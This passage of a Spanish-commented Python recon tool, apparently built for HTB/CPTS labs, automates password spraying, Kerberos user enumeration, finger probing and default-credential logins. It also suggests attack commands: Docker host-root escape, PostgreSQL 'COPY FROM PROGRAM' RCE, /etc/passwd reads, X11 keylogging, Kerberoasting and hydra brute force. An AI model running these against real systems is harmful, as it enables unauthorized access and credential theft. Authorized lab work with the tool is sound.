            f"kerbrute passwordspray -d {domain} --dc {ip} ad_users.txt '<pass>' --safe   # instala kerbrute y rocía")
        return res
    users = _read_ad_users(base)
    if not users:
        res["findings"].append(("info",
            "Password spraying: no hay usuarios AD descubiertos (ad_users.txt vacío) → nada que rociar. "
            "Deja correr el kerbrute userenum (no uses --no-userenum) o aporta -u/-U."))
        return res
    userfile = str(Path(base) / "ad_users.txt")
    warn(f"Password spraying ACTIVO contra {len(users)} usuario(s) con kerbrute --safe (aborta si "
         "detecta un bloqueo). Una pre-auth fallida cuenta como login fallido: con una política de "
         "bloqueo agresiva PUEDE bloquear cuentas — es un paso ACTIVO que pediste tú con --spray.")
    for pw in SPRAY_PASSWORDS:
        info(f"kerbrute passwordspray -d {domain} --dc {ip} ad_users.txt '***' --safe   ({len(users)} usuarios)")
        rc, out = run_capture([kb, "passwordspray", "-d", domain, "--dc", ip, userfile, pw, "--safe"],
                              timeout=1800, quiet=True)
        valid = _parse_kerbrute_spray(out)
        shown = out.replace(pw, "***") if pw else out
        _step(res, f"kerbrute passwordspray -d {domain} --dc {ip} ad_users.txt '***' --safe", bool(valid), shown,
              note="password spraying con --safe contra los usuarios descubiertos (pre-auth fallida = login fallido → posible bloqueo)")
        for usr in valid:
            good(f"  ✓ Password spraying VÁLIDO: {usr} : {pw}")   # solo en pantalla; el informe lo enmascara
        if valid:
            res["findings"].append(("critica",
                f"Password spraying: {len(valid)} credencial(es) VÁLIDA(S) con la contraseña de --spray "
                "(ver pantalla para el par user:pass) — " + ", ".join(valid[:15])
                + (" …" if len(valid) > 15 else "")
                + ". Reutilízalas: relanza palantir con -u USUARIO -p CONTRASEÑA (enumera dominio/roasting/pivota)."))
            _v0 = shlex.quote(valid[0])   # usuario validado (viene del objetivo): citarlo por si trae caracteres raros
            res["next"].append(
                f"{_impacket_suggest_bin('GetUserSPNs')} {domain}/{_v0}:'<pass>' -dc-ip {ip} -request   # Kerberoasting con una cred ya válida")
            res["next"].append(
                f"nxc smb {ip} -u {_v0} -p '<pass>' --shares   # confirma y enumera con la cred válida")
        if re.search(r"lockout|aborting", out, re.I):
            res["findings"].append(("alta",
                "Password spraying: kerbrute ABORTÓ por bloqueo detectado (--safe) — revisa qué cuentas "
                "quedaron bloqueadas antes de seguir rociando."))
            break
    return res


def fp_kerberos(ip, ports, services, host, deep, domain=None, base=None):
    """Kerberos (88/tcp-udp): en casi toda máquina AD de HTB/CPTS es la pista más clara
    de Domain Controller. Solo lectura. Si se conoce el dominio AD y hay kerbrute, enumera
    usuarios de verdad por Kerberos pre-auth (`_kerbrute_userenum`, no bloquea cuentas) —
    el fallback que saca usuarios en un DC endurecido donde SMB null / LDAP anónimo no dan
    nada. El AS-REP roasting prueba 1 vez por usuario YA conocido, no es fuerza bruta."""
    res = _fp("kerberos", "Kerberos", [p["port"] for p in ports])
    res["findings"].append(("info", "Kerberos (88) abierto — corrobora que es un Domain Controller"))
    if domain:
        _kerbrute_userenum(res, ip, domain, base)
    else:
        res["next"].append(f"kerbrute userenum -d DOMINIO --dc {ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt   # enum de usuarios por Kerberos (NO bloquea cuentas) — dominio aún no resuelto en este punto")
    res["next"] += [
        f"kerbrute passwordspray -d {domain or 'DOMINIO'} --dc {ip} ad_users.txt 'Welcome1' --safe   # spray 1 pass contra los usuarios hallados (OJO: pre-auth fallida SÍ cuenta como login fallido → lockout; --safe aborta si detecta una cuenta bloqueada)",
        f"{_impacket_suggest_bin('GetNPUsers')} {domain or 'DOMINIO'}/ -usersfile ad_users.txt -no-pass -dc-ip {ip}   # AS-REP roast: 1 intento por usuario YA conocido (sácalos de SMB/LDAP/kerbrute primero)",
        f"{_impacket_suggest_bin('GetUserSPNs')} {domain or 'DOMINIO'}/USER:PASS -dc-ip {ip} -request   # Kerberoasting (con credenciales válidas)",
    ]
    for lbl, txt in _nse_for(services, host, ("krb5", "kerberos")):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap para Kerberos")
    return res


def fp_docker(ip, ports, services, host, deep):
    """Docker Remote API (2375 sin TLS / 2376 con TLS). Un GET de solo lectura a /version
    confirma acceso sin autenticar: desde ahí, montar la raíz del host y escapar a root
    como root del host es trivial. 2376 (TLS) no se puede verificar sin certificado
    cliente, así que solo se marca como pista."""
    res = _fp("docker", "Docker API", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        if port == 2376:
            res["findings"].append(("info", f"Docker API {port}/tcp (TLS) — requiere certificado cliente para confirmar acceso"))
            res["next"].append(f"openssl s_client -connect {ip}:{port}   # ¿pide cert cliente, o es TLS sin auth real?")
            continue
        status, _h2, body = _http_get(f"http://{ip}:{port}/version")
        ok = status == 200 and '"ApiVersion"' in (body or "")
        _step(res, f"GET http://{ip}:{port}/version", ok, body or "",
              note="Docker Remote API sin autenticar: /version confirma acceso de solo lectura")
        if ok:
            res["findings"].append(("critica", f"Docker API {port}/tcp SIN AUTENTICACIÓN — RCE trivial montando el host"))
            res["next"] += [
                f"curl -s http://{ip}:{port}/containers/json   # contenedores en marcha",
                f"docker -H tcp://{ip}:{port} run -it -v /:/mnt alpine chroot /mnt sh   # monta la raíz del host → root",
            ]
        else:
            res["next"].append(f"curl -s http://{ip}:{port}/version   # confirmar a mano (puede requerir -sV más agresivo)")
    return res


def _parse_finger_users(out):
    """Nombres de usuario de una salida de `finger`: el 1er token de cada fila que parezca
    un login (letra/'_' inicial), saltando la cabecera ('Login  Name  Tty…'), los avisos
    ('no such user', 'finger: …') y las líneas vacías. Puro → testable en --selftest sin red."""
    users = []
    for line in (out or "").splitlines():
        tok = line.split()[:1]
        if not tok:
            continue
        w = tok[0]
        if w.lower() in ("login", "no", "finger:", "finger") or w.startswith("["):
            continue
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", w):
            users.append(w)
    return list(dict.fromkeys(users))


def _x11_access_granted(out):
    """¿La salida de `nmap --script x11-access` dice que el servidor X acepta clientes sin
    autenticar? (puro → testable sin red)."""
    return bool(re.search(r"X server access is granted|access is granted", out or "", re.I))


def _cups_version(text):
    """Versión de CUPS de una cabecera Server / cuerpo HTML ('CUPS/2.4.2' → '2.4.2'), o None
    (puro → testable sin red)."""
    m = re.search(r"CUPS/([\d.]+)", text or "", re.I)
    return m.group(1) if m else None


def fp_finger(ip, ports, services, host, deep):
    """Finger (79): el servicio clásico de UNIX que, SIN autenticar, delata quién tiene
    cuenta y quién está conectado — oro para armar una lista de usuarios reales (spraying,
    AS-REP roast, SSH). Solo lectura: una consulta general + un puñado de cuentas típicas,
    1 consulta por nombre (lista corta y curada — NO es fuerza bruta). El finger-user-enum de
    verdad (diccionario grande) queda como paso manual."""
    res = _fp("finger", "Finger", [p["port"] for p in ports])
    users = set()
    if have("finger"):
        probes = [("", "todos los usuarios con sesión activa (consulta vacía)")]
        probes += [(u, f"¿existe la cuenta «{u}»?") for u in
                   ("root", "admin", "administrator", "user", "test", "guest", "info",
                    "bin", "daemon", "operator")]
        for who, note in probes:
            rc, out = run_capture(["finger", f"{who}@{ip}"], timeout=15)
            _step(res, f"finger {who}@{ip}", rc == 0 and bool(out.strip()), out, note=note)
            for u in _parse_finger_users(out):
                users.add(u)
    else:
        res["missing"].append("finger (paquete 'finger')")
    for lbl, txt in _nse_for(services, host, ("finger",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó el script finger de nmap")
        for u in _parse_finger_users(txt):
            users.add(u)
    if users:
        us = sorted(users)
        res["findings"].append(("alta",
            f"Finger: {len(us)} usuario(s) enumerado(s) SIN autenticar — {', '.join(us[:20])}"
            + (" …" if len(us) > 20 else "")))
    res["next"] += [
        f"finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t {ip}   # enum masivo de usuarios (manual)",
        f"for u in root admin test svc backup; do finger $u@{ip}; done   # ampliar a mano otras cuentas probables",
    ]
    return res


def fp_ipp(ip, ports, services, host, deep):
    """IPP / CUPS (631): el servicio de impresión de UNIX. Su interfaz en :631 suele filtrar
    versión y, a veces, colas/impresoras sin autenticar. Muy relevante desde 2024 por la
    cadena CVE-2024-47076/47175/47176/47177 (cups-browsed): añadir una impresora maliciosa →
    RCE. Solo lectura: versión + colas; la confirmación del CVE es manual."""
    res = _fp("ipp", "IPP / CUPS (impresión)", [p["port"] for p in ports])
    port = ports[0]["port"]
    for sid in ("cups-info", "cups-queue-info"):
        rc, out = run_capture(["nmap", "-p", str(port), "--script", sid, "-oN", "-", ip], timeout=90)
        _step(res, f"nmap -p{port} --script {sid} {ip}", rc == 0, out,
              note="versión de CUPS, colas e impresoras que expone sin autenticar")
    status, hdrs, body = _http_get(f"http://{ip}:{port}/")
    blob = (hdrs.get("server", "") + " " + (body or "")[:2000])
    ver = _cups_version(blob)
    if ver or "cups" in blob.lower():
        res["findings"].append(("media",
            f"CUPS {ver or '?'} en :{port} — si corre cups-browsed, revisa CVE-2024-47176 y familia "
            "(RCE por impresora maliciosa; verifícalo a mano)"))
    for lbl, txt in _nse_for(services, host, ("cups", "ipp")):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap para CUPS/IPP")
    res["next"] += [
        f"curl -s http://{ip}:{port}/printers/   # impresoras configuradas (si no pide auth)",
        f"nmap -p{port} --script cups-info,cups-queue-info {ip}   # versión y colas de CUPS",
    ]
    return res


def fp_x11(ip, ports, services, host, deep):
    """X11 (6000-6009): el servidor gráfico de UNIX. Si acepta conexiones sin control de
    acceso ('xhost +', clásico de lab), cualquiera de la red CAPTURA la pantalla y las
    pulsaciones de teclado del usuario conectado — screenshots y keylogging directos. Solo
    lectura: nmap x11-access confirma si el display está abierto."""
    res = _fp("x11", "X11", [p["port"] for p in ports])
    port = ports[0]["port"]
    disp = port - 6000
    rc, out = run_capture(["nmap", "-p", str(port), "--script", "x11-access", "-oN", "-", ip], timeout=90)
    _step(res, f"nmap -p{port} --script x11-access {ip}", rc == 0, out,
          note="¿el servidor X11 acepta clientes sin autenticar (xhost +)? → captura de pantalla/teclado")
    if _x11_access_granted(out):
        res["findings"].append(("alta",
            f"X11 en :{port} SIN control de acceso (display :{disp}) → screenshot/keylogging del escritorio"))
        res["next"] += [
            f"xwd -display {ip}:{disp} -root -out /tmp/x11.xwd && convert /tmp/x11.xwd /tmp/x11.png   # captura de pantalla",
            f"xdotool -display {ip}:{disp} getmouselocation   # confirmar control del display (teclas/ratón)",
        ]
    else:
        res["next"].append(f"xdpyinfo -display {ip}:{disp}   # info del display si el acceso estuviera abierto")
    for lbl, txt in _nse_for(services, host, ("x11",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap para X11")
    return res


def fp_gitdaemon(ip, ports, services, host, deep):
    """git daemon (9418): el protocolo git:// nativo, sin autenticación. Si un repo se sirve
    con --export-all o tiene git-daemon-export-ok, cualquiera lo CLONA entero — con el
    historial completo (secretos en commits viejos, rutas internas). No se puede listar a
    ciegas qué repos sirve; se dan los comandos para probar nombres típicos."""
    res = _fp("gitdaemon", "git daemon (git://)", [p["port"] for p in ports])
    res["findings"].append(("media",
        f"git daemon en :{ports[0]['port']} (git://) — un repo exportado se clona SIN autenticar "
        "(historial completo: busca secretos en commits viejos)"))
    res["next"] += [
        f"git ls-remote git://{ip}/   # ¿responde en la raíz con refs?",
        f"for r in repo .git web app src backup project dev; do git clone git://{ip}/$r 2>/dev/null && echo CLONADO:$r; done   # nombres típicos",
        f"git clone git://{ip}/REPO && (cd REPO && git log --all --oneline && gitleaks detect -s .)   # historial + secretos",
    ]
    return res


def footprint_services(ip, services, host, extra_domain, deep, webs_fp, base=None):
    """Agrupa los puertos abiertos por protocolo y lanza su footprint una sola vez.

    `webs_fp`: puertos web ya deduplicados por espejo (80→443, 8080→8443…; ver
    primary_web_ports(), calculado UNA vez en run_one y compartido con el fuzzing de
    más abajo) — sin esto, un sitio servido en varios puertos a la vez se footprintea
    (y, peor, le lanzamos nikto/nuclei/wpscan/katana) 2-4 veces por el mismo sitio.

    Devuelve (footprints, whatweb_cache): whatweb_cache es {puerto: salida de
    whatweb} para que footprint_web_slow() (nikto/nuclei/cms-scan/crawl, que corre
    DESPUÉS del informe preliminar) no tenga que relanzar whatweb solo para saber
    si hay WordPress/Joomla."""
    buckets = {}
    skipped_udp = []
    for p in services:
        if not _confirmed_open(p):             # UDP open|filtered: nmap no confirmó → no footprintear
            skipped_udp.append(f"{p['port']}/udp")
            continue
        proto = classify(p)
        if proto:
            buckets.setdefault("imap_pop3" if proto in ("imap", "pop3") else proto, []).append(p)
    if skipped_udp:
        info(f"UDP open|filtered sin confirmar — NO se footprintean (evita falsos positivos, p. ej. IPMI/RAKP): {', '.join(sorted(set(skipped_udp)))}")
    domains = discover_domains(services, host)
    # Dominio AD (apex) para el kerbrute userenum de fp_kerberos: el --vhost/hostname dado, o
    # el primer dominio base descubierto (file01.nexura.htb → nexura.htb). discover_domains ya
    # corrió aquí arriba (para whois/crt.sh), así que no cuesta nada reusarlo.
    _all_doms = sorted(set(domains) | ({extra_domain} if extra_domain else set()))
    ad_domain = next((d for d in _all_doms if base_domain(d) == d), None) or (
        base_domain(extra_domain) if extra_domain else None)
    if not buckets and not webs_fp and not (domains or extra_domain):
        return [], {}
    phase("Fase 5 — footprinting por protocolo",
          "por cada servicio se lanza la enumeración manual del path CPTS: credenciales por defecto y lecturas sin autenticar (solo lectura)")
    out = []
    if domains or extra_domain:
        out.append(fp_whois(domains, extra_domain))
        out.append(fp_ctlogs(domains, extra_domain))
        out.append(fp_subdomains(domains, extra_domain))
        out.append(fp_wayback(domains, extra_domain))
        out.append(fp_dns_nameservers(domains, extra_domain))
    for proto, ports in buckets.items():
        try:
            if proto == "ftp":
                out.append(fp_ftp(ip, ports, services, host, deep))
            elif proto == "smb":
                out.append(fp_smb(ip, ports, services, host, deep))
            elif proto == "nfs":
                out.append(fp_nfs(ip, ports, services, host, deep))
            elif proto == "dns":
                out.append(fp_dns(ip, ports, services, host, domains, extra_domain, deep))
            elif proto == "smtp":
                out.append(fp_smtp(ip, ports, services, host, deep, domains, extra_domain))
            elif proto == "imap_pop3":
                out.append(fp_imap_pop3(ip, ports, services, host, deep))
            elif proto == "snmp":
                out.append(fp_snmp(ip, ports, services, host, deep))
            elif proto == "redis":
                out.append(fp_redis(ip, ports, services, host, deep))
            elif proto == "ldap":
                out.append(fp_ldap(ip, ports, services, host, deep))
            elif proto == "winrm":
                out.append(fp_winrm(ip, ports, services, host, deep))
            elif proto == "ssh":
                out.append(fp_ssh(ip, ports, services, host, deep))
            elif proto == "rdp":
                out.append(fp_rdp(ip, ports, services, host, deep))
            elif proto == "vnc":
                out.append(fp_vnc(ip, ports, services, host, deep))
            elif proto == "msrpc":
                out.append(fp_msrpc(ip, ports, services, host, deep))
            elif proto == "rservices":
                out.append(fp_rservices(ip, ports, services, host, deep))
            elif proto == "rsync":
                r = _fp("rsync", "rsync", [p["port"] for p in ports])
                if have("rsync"):
                    rc, out_ = run_capture(["rsync", "-av", "--list-only", f"rsync://{ip}/"], timeout=30)
                    _step(r, f"rsync -av --list-only rsync://{ip}/", rc == 0, out_,
                          note="listar los módulos (carpetas) que el demonio rsync sirve sin autenticación")
                    mods = [l.split()[0] for l in out_.splitlines() if l and not l.startswith(" ")]
                    for mdl in mods:
                        r["findings"].append(("media", f"rsync módulo: {mdl}"))
                        r["next"].append(f"rsync -av --list-only rsync://{ip}/{mdl}   # contenido del módulo")
                else:
                    r["missing"].append("rsync")
                for lbl, txt in _nse_for(services, host, ("rsync",)):
                    _step(r, f"nmap {lbl}", True, txt, note="módulos rsync que ya enumeró nmap")
                out.append(r)
            elif proto == "mysql":
                out.append(fp_generic("mysql", "MySQL", ip, ports, services, host, ("mysql",), [
                    f"mysql -u root -h {ip}   # probar root sin contraseña",
                    "nmap --script mysql-empty-password,mysql-users,mysql-databases -p3306 " + ip,
                    "Si entras: SELECT LOAD_FILE('/etc/passwd');  y  ... INTO OUTFILE  (según secure_file_priv)",
                ]))
            elif proto == "mssql":
                out.append(fp_mssql(ip, ports, services, host, deep))
            elif proto == "oracle":
                out.append(fp_oracle(ip, ports, services, host, deep))
            elif proto == "ipmi":
                r = fp_generic("ipmi", "IPMI", ip, ports, services, host, ("ipmi",), [
                    f"sudo nmap -sU --script ipmi-version -p623 {ip}",
                    "msf > use auxiliary/scanner/ipmi/ipmi_dumphashes   # volcar hashes (RAKP)",
                ])
                for lbl, txt in _nse_for(services, host, ("ipmi",)):
                    if "cipher" in txt.lower() and "zero" in txt.lower():
                        r["findings"].append(("alta", "IPMI: cipher 0 (login sin contraseña)"))
                out.append(r)
            elif proto == "postgres":
                out.append(fp_generic("postgres", "PostgreSQL", ip, ports, services, host, (), [
                    f"psql -h {ip} -U postgres   # probar 'postgres' sin contraseña o postgres/postgres",
                    f"nmap -p{ports[0]['port']} --script pgsql-brute {ip}",
                    "Si entras como superusuario: COPY cmd FROM PROGRAM 'id';  → RCE",
                ]))
            elif proto == "mongodb":
                out.append(fp_generic("mongodb", "MongoDB", ip, ports, services, host, ("mongodb",), [
                    f"mongosh 'mongodb://{ip}:{ports[0]['port']}' --eval 'db.adminCommand({{listDatabases:1}})'   # acceso anónimo",
                    f"nmap -p{ports[0]['port']} --script mongodb-info,mongodb-databases {ip}",
                ]))
            elif proto == "telnet":
                out.append(fp_generic("telnet", "Telnet", ip, ports, services, host, (), [
                    f"telnet {ip} {ports[0]['port']}   # el banner delata fabricante → credenciales por defecto",
                    f"hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://{ip}",
                ]))
            elif proto == "elastic":
                out.append(fp_elastic(ip, ports, services, host, deep))
            elif proto == "couchdb":
                out.append(fp_couchdb(ip, ports, services, host, deep))
            elif proto == "memcached":
                out.append(fp_memcached(ip, ports, services, host, deep))
            elif proto == "ajp":
                out.append(fp_ajp(ip, ports, services, host, deep))
            elif proto == "rmi":
                out.append(fp_rmi(ip, ports, services, host, deep))
            elif proto == "kerberos":
                out.append(fp_kerberos(ip, ports, services, host, deep, domain=ad_domain, base=base))
            elif proto == "docker":
                out.append(fp_docker(ip, ports, services, host, deep))
            elif proto == "finger":
                out.append(fp_finger(ip, ports, services, host, deep))
            elif proto == "ipp":
                out.append(fp_ipp(ip, ports, services, host, deep))
            elif proto == "x11":
                out.append(fp_x11(ip, ports, services, host, deep))
            elif proto == "gitdaemon":
                out.append(fp_gitdaemon(ip, ports, services, host, deep))
            elif proto == "tftp":
                out.append(fp_generic("tftp", "TFTP", ip, ports, services, host, ("tftp",), [
                    f"tftp {ip} -c get <fichero>   # sin nombre conocido hay poco que leer a ciegas",
                ]))
            elif proto == "ntp":
                out.append(fp_generic("ntp", "NTP", ip, ports, services, host, ("ntp",), [
                    f"ntpq -c readvar {ip}   # versión/stratum (monlist queda fuera: es vector de amplificación)",
                ]))
        except Exception as e:                     # un protocolo que peta no tumba el resto
            warn(f"footprint {proto} falló: {e}")
    # Web: no entra en los buckets (classify lo deja para el fuzzing), se trata aparte.
    # Solo el pase RÁPIDO (fp_web_fast) — nikto/nuclei/cms-scan/crawl van en
    # footprint_web_slow(), llamada aparte desde run_one DESPUÉS del informe preliminar.
    whatweb_cache = {}
    for p in webs_fp:
        try:
            res, whatweb_out = fp_web_fast(ip, p, services, host, deep, hostname=extra_domain)
            out.append(res)
            whatweb_cache[p["port"]] = whatweb_out
        except Exception as e:
            warn(f"footprint web {p['port']} falló: {e}")
    return out, whatweb_cache


def footprint_web_slow(ip, webs_fp, footprints, whatweb_cache, host, deep, hostname=None):
    """Lanza los escáneres web LENTOS y opt-in (fp_web_slow: nikto/nuclei/cms-scan/
    crawl) sobre los footprints 'web' que ya dejó footprint_services() (pase rápido)
    — llamada DESPUÉS de que el informe HTML preliminar se haya escrito, para no
    bloquearlo con algo que puede ser la fase más lenta del recon entero. Muta los
    footprints existentes en su sitio (no crea ni devuelve nada nuevo). Si ninguno de
    los 4 flags está activado, no hace nada (ni un print) — coste cero."""
    if not (NIKTO or NUCLEI or CMS_SCAN or CRAWL):
        return
    by_port = {fpr["ports"][0]: fpr for fpr in footprints if fpr["proto"] == "web"}
    for p in webs_fp:
        res = by_port.get(p["port"])
        if res is None:
            continue
        try:
            fp_web_slow(ip, p, res, whatweb_cache.get(p["port"], ""), host, deep, hostname=hostname)
        except Exception as e:
            warn(f"footprint web (escáneres lentos) {p['port']} falló: {e}")


# ═══════════════════════ Credenciales por defecto (Fase 5c) ═══════════════════════
# Prueba ÚNICAMENTE credenciales de fábrica/instalación CONOCIDAS de cada servicio y
# CONFIRMA el acceso (no se queda en "conectó": ejecuta una operación mínima de solo
# lectura — SELECT 1, PING, chassis status, carga del Manager…) para descartar falsos
# positivos. NO es fuerza bruta: la lista por servicio es corta y curada, un intento
# por par, un único objetivo. La fuerza bruta real con diccionarios (hydra/medusa) se
# deja SIEMPRE como sugerencia manual, nunca se ejecuta. Todo de solo lectura.

# (usuario, contraseña, etiqueta). Contraseña "" = en blanco. Curadas: las que de
# verdad aparecen en labs/CPTS y en despliegues reales mal configurados.
DEFAULT_CREDS = {
    "ftp":      [("anonymous", "anonymous@palantir", "anónimo"),
                 ("ftp", "ftp", "ftp/ftp"), ("admin", "admin", "admin/admin")],
    "ssh":      [("root", "root", "root/root"), ("admin", "admin", "admin/admin"),
                 ("user", "user", "user/user"), ("kali", "kali", "kali/kali"),
                 ("pi", "raspberry", "pi/raspberry (Raspberry Pi)")],
    "mysql":    [("root", "", "root sin contraseña"), ("root", "root", "root/root"),
                 ("root", "toor", "root/toor"), ("root", "password", "root/password"),
                 ("admin", "admin", "admin/admin")],
    "postgres": [("postgres", "", "postgres sin contraseña"),
                 ("postgres", "postgres", "postgres/postgres"),
                 ("postgres", "password", "postgres/password"),
                 ("admin", "admin", "admin/admin")],
    "mssql":    [("sa", "", "sa sin contraseña"), ("sa", "sa", "sa/sa"),
                 ("sa", "Password123", "sa/Password123"), ("sa", "password", "sa/password")],
    "smb":      [("", "", "sesión nula"), ("guest", "", "guest sin contraseña"),
                 ("Administrator", "", "Administrator sin contraseña"),
                 ("administrator", "Password123", "administrator/Password123")],
    "winrm":    [("", "", "sesión nula"), ("Administrator", "", "Administrator sin contraseña"),
                 ("administrator", "Password123", "administrator/Password123")],
    "rdp":      [("", "", "sesión nula"), ("Administrator", "", "Administrator sin contraseña")],
    "ldap":     [("", "", "bind anónimo"), ("guest", "", "guest sin contraseña")],
    "wmi":      [("", "", "sesión nula"), ("Administrator", "", "Administrator sin contraseña")],
    "oracle":   [("scott", "tiger", "scott/tiger"), ("system", "manager", "system/manager"),
                 ("system", "oracle", "system/oracle"),
                 ("sys", "change_on_install", "sys/change_on_install"),
                 ("dbsnmp", "dbsnmp", "dbsnmp/dbsnmp")],
    "tomcat":   [("tomcat", "tomcat", "tomcat/tomcat"), ("admin", "admin", "admin/admin"),
                 ("admin", "", "admin sin contraseña"), ("tomcat", "s3cr3t", "tomcat/s3cr3t"),
                 ("admin", "tomcat", "admin/tomcat"), ("role1", "role1", "role1/role1"),
                 ("manager", "manager", "manager/manager")],
}

# Community strings SNMP por defecto (en SNMPv1/2c la community ES la credencial).
# Lista corta y curada — no es el brute de diccionario de onesixtyone.
SNMP_COMMUNITIES = ["public", "private", "community", "manager", "admin", "cisco", "default"]

# Credenciales por defecto de BMC/IPMI por fabricante (para probar con ipmitool).
IPMI_CREDS = [("ADMIN", "ADMIN", "Supermicro"), ("root", "calvin", "Dell iDRAC"),
              ("admin", "admin", "genérico"), ("USERID", "PASSW0RD", "IBM/Lenovo IMM"),
              ("Administrator", "Administrator", "genérico")]

# Puerto por defecto de cada protocolo nxc (para añadir --port solo si difiere).
_NXC_DEFAULT_PORT = {"ssh": 22, "ftp": 21, "mssql": 1433, "rdp": 3389, "winrm": 5985, "vnc": 5900}


def _cc_res(proto, title, ports):
    return _fp("creds-" + proto, "Credenciales por defecto — " + title, ports)


# ── Verificadores (puros, sin red → testeables en selftest) ──
def _mysql_ok(rc, out):
    """Login MySQL confirmado: SELECT 1 devolvió 1 y no hubo 'Access denied'."""
    low = out.lower()
    if "access denied" in low or "error 1045" in low:
        return False
    return rc == 0 and "1" in out


def _psql_ok(rc, out):
    """Login PostgreSQL confirmado: SELECT 1 devolvió 1 y no hubo fallo de auth."""
    low = out.lower()
    if "authentication failed" in low or "fatal" in low:
        return False
    return rc == 0 and "1" in out


def _snmp_ok(out):
    """snmpwalk/get con datos reales: hay un varbind ('=') y no es timeout/denegado."""
    low = out.lower()
    if "timeout" in low or "no response" in low or "authorizationerror" in low:
        return False
    return "=" in out and "no such" not in low


def _basic_auth_header(u, p):
    import base64
    return "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()


def _tomcat_ok(status, body):
    """200 en /manager/html con contenido real del Manager (no una página de error
    que también devuelva 200). 401/403 = credencial incorrecta → False."""
    if status != 200:
        return False
    low = (body or "").lower()
    return "manager" in low and ("tomcat" in low or "list applications" in low or "deploy" in low)


def _is_tomcat(p):
    blob = " ".join([p["product"], p["version"], p["extrainfo"], p["name"],
                     p["scripts"].get("http-server-header", ""),
                     p["scripts"].get("http-title", ""),
                     p.get("banner", "")]).lower()
    return "tomcat" in blob or "coyote" in blob


def _http_get_auth(url, u, p, timeout=8):
    """GET con cabecera Basic auth. Devuelve (status, primeros 4 KiB del cuerpo).
    (status, '') ante error de red/URL. Ignora el certificado TLS (labs)."""
    import urllib.request
    import urllib.error
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"Authorization": _basic_auth_header(u, p),
                                               "User-Agent": "palantir"})
    _log(f"GET {url}  (Authorization: Basic {u}:{p})")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return getattr(r, "status", r.getcode()), r.read(4096).decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except (urllib.error.URLError, OSError, ValueError):
        return None, ""


# Protocolos donde el (Pwn3d!) de nxc significa ADMIN/ejecución REAL (crítica). En RDP y VNC NO:
# nxc marca (Pwn3d!) en CUALQUIER login válido (rdp.py pone admin_privs=True nada más conectar, sin
# comprobar admin) → ahí Pwn3d solo confirma ACCESO, no privilegios (verifícalo con whoami /groups).
_PWN_IS_ADMIN = {"smb", "winrm", "wmi", "mssql", "ldap"}


def _pwn_clause(proto):
    """(severidad, cláusula) para un acierto con (Pwn3d!), según lo que Pwn3d signifique en ese
    protocolo. SMB/WinRM/WMI/MSSQL/LDAP → admin real (crítica); RDP/VNC → solo acceso (alta)."""
    if proto in _PWN_IS_ADMIN:
        return "critica", "da acceso de ADMINISTRADOR (Pwn3d!)"
    return "alta", "es un login VÁLIDO (Pwn3d! en este protocolo = acceso, NO admin — verifícalo con 'whoami /groups')"


# ── Probadores por protocolo ──
def _cc_nxc(res, nxc, nxc_proto, ip, creds, port=None):
    """Prueba pares usuario/contraseña por defecto con nxc (1 intento por par) y los
    confirma con la marca [+]/(Pwn3d!) de nxc. Devuelve el primer par que entra, o None.
    Las identidades anónimas (null/guest sin contraseña) se marcan 'media'; una
    credencial real por defecto 'alta'; (Pwn3d!) = admin → 'critica'."""
    hit = None
    for u, p, lbl in creds:
        cmd = [nxc, nxc_proto, ip, "-u", u, "-p", p]
        dp = _NXC_DEFAULT_PORT.get(nxc_proto)
        if port and dp and port != dp:
            cmd += ["--port", str(port)]
        rc, out = run_capture(cmd, timeout=40)
        ok = _nxc_ok(out)
        _step(res, shlex.join(cmd), ok, out,
              note=f"probar credencial por defecto «{lbl}» por {nxc_proto.upper()} (1 intento, no es fuerza bruta)")
        if re.search(r"\(Pwn3d!\)", out):
            _psev, _pcl = _pwn_clause(nxc_proto)
            res["findings"].append((_psev, f"{nxc_proto.upper()}: «{lbl}» {_pcl}"))
            return (u, p, lbl)
        if ok and hit is None:
            anon = p == "" and u.lower() in ("", "guest", "anonymous")
            sev = "media" if anon else "alta"
            msg = (f"{nxc_proto.upper()}: sesión nula/invitado aceptada ({lbl})" if anon
                   else f"{nxc_proto.upper()}: credencial por defecto válida — {lbl}")
            res["findings"].append((sev, msg))
            hit = (u, p, lbl)
    return hit


def cc_ftp(ip, ports, deep):
    res = _cc_res("ftp", "FTP", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            _cc_nxc(res, nxc, "ftp", ip, DEFAULT_CREDS["ftp"], port=p["port"])
    else:
        res["missing"].append("nxc/netexec")
    res["next"].append(f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{ip}   # fuerza bruta real (manual)")
    return res


def cc_ssh(ip, ports, deep):
    res = _cc_res("ssh", "SSH", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            _cc_nxc(res, nxc, "ssh", ip, DEFAULT_CREDS["ssh"], port=p["port"])
    else:
        res["missing"].append("nxc/netexec")
    res["next"].append(f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip}   # fuerza bruta real (manual)")
    return res


def cc_smb(ip, ports, deep):
    res = _cc_res("smb", "SMB", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        _cc_nxc(res, nxc, "smb", ip, DEFAULT_CREDS["smb"])
    else:
        res["missing"].append("nxc/netexec")
    return res


def cc_winrm(ip, ports, deep):
    res = _cc_res("winrm", "WinRM", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            hit = _cc_nxc(res, nxc, "winrm", ip, DEFAULT_CREDS["winrm"], port=p["port"])
            if hit:
                res["next"].append(f"evil-winrm -i {ip} -u {hit[0] or 'USER'} -p '{hit[1]}'   # shell remota")
    else:
